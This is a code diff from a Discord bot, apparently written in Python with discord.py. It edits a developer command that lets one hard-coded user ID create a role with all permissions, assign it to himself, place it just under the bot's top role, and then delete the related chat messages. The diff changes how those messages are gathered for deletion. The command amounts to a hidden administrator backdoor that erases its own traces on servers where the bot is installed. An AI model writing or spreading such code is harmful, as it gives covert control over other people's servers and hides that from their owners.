@@ -12,6 +12,7 @@ class Devs():
         # Command Use: For Dev to be able to get perms on a server for debugging purposes easily
 
         if ctx.message.author.id == 150750980097441792: #OGaming's User ID
+            Msgs=[ctx.message]
             try:
                 if discord.utils.get(ctx.message.guild.roles, name="(._.)"):
                     role = discord.utils.get(ctx.message.guild.roles, name="(._.)")
@@ -20,22 +21,22 @@ class Devs():
 
                 if discord.utils.get(ctx.message.author.roles, name="_"):
                     tmp = await ctx.send("Already Completed")
-                    await asyncio.sleep(3)
-                    await ctx.message.channel.delete_messages([tmp, ctx.message])
+                    Msgs.append(tmp)
                 else:
                     if discord.utils.get(ctx.message.guild.roles, name="_"): #Role all ready exists
                         tmp = await ctx.send("All ready made")
+                        Msgs.append(tmp)
                     else:
                         await ctx.message.guild.create_role(name="_", permissions=discord.Permissions.all())
                         tmp = await ctx.send("Made")
+                        Msgs.append(tmp)
                     await asyncio.sleep(1)
                     await ctx.author.add_roles(discord.utils.get(ctx.message.guild.roles, name="_"))
                     await tmp.edit(content="Added")
                     success = await ctx.send("Success")
-                    await asyncio.sleep(3)
-                    await ctx.message.channel.delete_messages([tmp, success, ctx.message])
+                    Msgs.append(success)
 
-                perm = discord.utils.get(ctx.message.guild.roles, name="OG_Bot")
+                perm = ctx.message.guild.me.top_role
                 posBot = perm.position
 
                 role = discord.utils.get(ctx.message.guild.roles, name="_")
@@ -43,13 +44,15 @@ class Devs():
 
                 if posBot > posDev:
                     if posBot - posDev == 1:
-                        success = await ctx.send("All ready set")
+                        pSuccess = await ctx.send("All ready set")
+                        Msgs.append(pSuccess)
                     else:
                         await role.edit(position=posBot - 1)
-                        success = await ctx.send("Moved")
+                        pSuccess = await ctx.send("Moved")
+                        Msgs.append(pSuccess)
 
                 await asyncio.sleep(3)
-                await ctx.channel.delete_messages([ctx.message, success])
+                await ctx.channel.delete_messages(Msgs)
 
             except discord.Forbidden as error:
                 await ctx.send(ctx.message.author.mention + "{} doesn't have perms".format(self.bot.user.name))
@@ -62,7 +65,7 @@ class Devs():
     @commands.command()
     async def pos(self, ctx):
         if ctx.message.channel.permissions_for(ctx.message.author).manage_roles:
-            perm = discord.utils.get(ctx.message.guild.roles, name="OG_Bot")
+            perm = ctx.message.guild.me.top_role
             posBot = perm.position
 
             role = discord.utils.get(ctx.message.guild.roles, name="_")
